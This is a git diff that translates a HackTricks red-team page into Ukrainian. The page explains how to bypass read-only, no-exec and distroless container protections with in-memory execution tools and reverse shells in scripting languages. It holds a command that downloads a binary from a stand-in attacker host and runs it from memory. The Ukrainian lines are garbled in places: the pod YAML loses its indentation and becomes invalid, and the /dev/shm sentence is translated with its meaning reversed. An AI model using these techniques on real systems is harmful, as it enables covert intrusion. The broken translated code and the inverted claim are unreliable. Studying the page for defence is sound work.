@@ -1,93 +1,91 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# Обхід захисту файлової системи: тільки для читання / без виконання / Distroless
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+Якщо вас цікавить **кар'єра хакера** і взламати невзламне - **ми шукаємо співробітників!** (_вимагається вільне володіння польською мовою, як письмово, так і усно_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
-## Videos
+## Відео
 
-In the following videos you can find the techniques mentioned in this page explained more in depth:
+У наступних відео ви знайдете техніки, згадані на цій сторінці, пояснені більш детально:
 
-* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**DEF CON 31 - Дослідження маніпулювання пам'яттю Linux для прихованості та ухилення**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**Приховані вторгнення з DDexec-ng та in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
-## read-only / no-exec scenario
+## Сценарій тільки для читання / без виконання
 
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+Стає все більш поширеним знаходити лінукс-машини, які мають захист файлової системи **тільки для читання (ro)**, особливо в контейнерах. Це тому, що для запуску контейнера з файловою системою ro досить просто встановити **`readOnlyRootFilesystem: true`** в `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+Однак, навіть якщо файлова система монтується як ro, **`/dev/shm`** все ще буде доступним для запису, тому це фактично означає, що ми можемо записувати дані на диск. Однак ця папка буде **монтуватися з захистом no-exec**, тому якщо ви завантажите бінарний файл сюди, ви **не зможете виконати його**.
 
 {% hint style="warning" %}
-From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+З погляду червоної команди це ускладнює **завантаження та виконання** бінарних файлів, яких немає в системі (наприклад, backdoors або інструменти для переліку, такі як `kubectl`).
 {% endhint %}
 
-## Easiest bypass: Scripts
+## Найпростіший обхід: Сценарії
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+Зверніть увагу, що я згадав про бінарні файли, ви можете **виконати будь-який сценарій**, якщо інтерпретатор знаходиться всередині машини, наприклад, **сценарій оболонки**, якщо присутній `sh` або **сценарій Python**, якщо встановлено `python`.
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+Однак цього недостатньо для виконання вашого бінарного backdoor або інших бінарних інструментів, які вам може знадобитися запустити.
 
-## Memory Bypasses
+## Обхід пам'яті
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+Якщо ви хочете виконати бінарний файл, але файлова система не дозволяє цього зробити, найкращий спосіб - **виконати його з пам'яті**, оскільки **захисти не застосовуються там**.
 
-### FD + exec syscall bypass
+### Обхід FD + exec syscall
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
+Якщо у вас є потужні скриптові двигуни всередині машини, такі як **Python**, **Perl** або **Ruby**, ви можете завантажити бінарний файл для виконання з пам'яті, зберегти його в дескрипторі файлу пам'яті (`create_memfd` syscall), який не буде захищений цими захистами, а потім викликати **системний виклик exec**, вказавши **fd як файл для виконання**.
 
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
+Для цього ви можете легко використовувати проект [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Ви можете передати йому бінарний файл, і він згенерує сценарій на вказаній мові з **бінарним файлом стиснутим і закодованим у b64** з інструкціями для **декодування та розпакування** його в **fd**, створеного за допомогою виклику `create_memfd` syscall та виклику **exec** syscall для його запуску.
 
 {% hint style="warning" %}
-This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
+Це не працює в інших мовах сценаріїв, таких як PHP або Node, оскільки вони не мають жодного **стандартного способу виклику сирі системні виклики** з сценарію, тому неможливо викликати `create_memfd` для створення **дескриптора файлу пам'яті** для зберігання бінарного файлу.
 
-Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
+Більше того, створення **звичайного дескриптора файлу** з файлом у `/dev/shm` не працюватиме, оскільки ви не зможете його запустити через застосування **захисту no-exec**.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) - це техніка, яка дозволяє вам **змінювати пам'ять вашого власного процесу**, перезаписуючи його **`/proc/self/mem`**.
 
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
+Отже, **керуючи кодом асемблера**, який виконується процесом, ви можете написати **шелл-код** та "мутувати" процес для **виконання будь-якого довільного коду**.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
+**DDexec / EverythingExec** дозволить вам завантажувати та **виконувати** ваш власний **шелл-код** або **будь-який бінарний файл** з **пам'яті**.
 {% endhint %}
-
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
-For more information about this technique check the Github or:
+Для отримання додаткової інформації про цю техніку перевірте Github або:
 
 {% content-ref url="ddexec.md" %}
 [ddexec.md](ddexec.md)
@@ -95,60 +93,60 @@ For more information about this technique check the Github or:
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) - це природний наступний крок після DDexec. Це **демонізований shellcode DDexec**, тому кожного разу, коли вам потрібно **запустити інший бінарний файл**, вам не потрібно перезапускати DDexec, ви можете просто запустити shellcode memexec через техніку DDexec, а потім **спілкуватися з цим демоном, щоб передати нові бінарні файли для завантаження та запуску**.
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Ви можете знайти приклад того, як використовувати **memexec для виконання бінарних файлів з PHP зворотним шелом** за посиланням [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+З аналогічною метою DDexec, техніка [**memdlopen**](https://github.com/arget13/memdlopen) дозволяє **легший спосіб завантаження бінарних файлів** в пам'ять для подальшого їх виконання. Це може навіть дозволити завантажувати бінарні файли залежностей.
 
-## Distroless Bypass
+## Обхід Distroless
 
-### What is distroless
+### Що таке distroless
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+Контейнери Distroless містять лише **мінімальний набір компонентів, необхідних для запуску конкретного додатка або служби**, таких як бібліотеки та залежності виконання, але виключають більші компоненти, такі як менеджер пакетів, оболонка або службові програми.
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+Метою контейнерів Distroless є **зменшення поверхні атаки контейнерів шляхом усунення непотрібних компонентів** та мінімізація кількості вразливостей, які можуть бути використані.
 
-### Reverse Shell
+### Зворотній шел
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+У контейнері Distroless ви можливо **навіть не знайдете `sh` або `bash`**, щоб отримати звичайну оболонку. Ви також не знайдете бінарних файлів, таких як `ls`, `whoami`, `id`... все, що зазвичай виконуєте в системі.
 
 {% hint style="warning" %}
-Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+Отже, ви **не зможете** отримати **зворотню оболонку** або **провести перелік** системи, як зазвичай.
 {% endhint %}
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
+Однак, якщо компрометований контейнер запускає, наприклад, веб-додаток flask, то встановлено Python, і тому ви можете отримати **зворотню оболонку Python**. Якщо він запускається на node, ви можете отримати оболонку Node, і те ж саме з практично будь-якою **мовою сценаріїв**.
 
 {% hint style="success" %}
-Using the scripting language you could **enumerate the system** using the language capabilities.
+Використовуючи мову сценаріїв, ви можете **провести перелік системи**, використовуючи можливості мови.
 {% endhint %}
 
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+Якщо відсутні **захисти `read-only/no-exec`**, ви можете зловживати своєю зворотною оболонкою, щоб **записати свої бінарні файли в файлову систему** та **виконати** їх.
 
 {% hint style="success" %}
-However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+Однак у таких контейнерах зазвичай існуватимуть ці захисти, але ви можете використати **попередні техніки виконання в пам'яті для їх обходу**.
 {% endhint %}
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Ви можете знайти **приклади** того, як **експлуатувати деякі вразливості RCE** для отримання **зворотних оболонок мов сценаріїв** та виконання бінарних файлів з пам'яті за посиланням [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
 <figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
+Якщо вас цікавить **кар'єра хакера** та взлам невзламного - **ми наймаємо!** (_вимагається вільне володіння польською мовою, як письмово, так і усно_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчіть хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.
 
 </details>
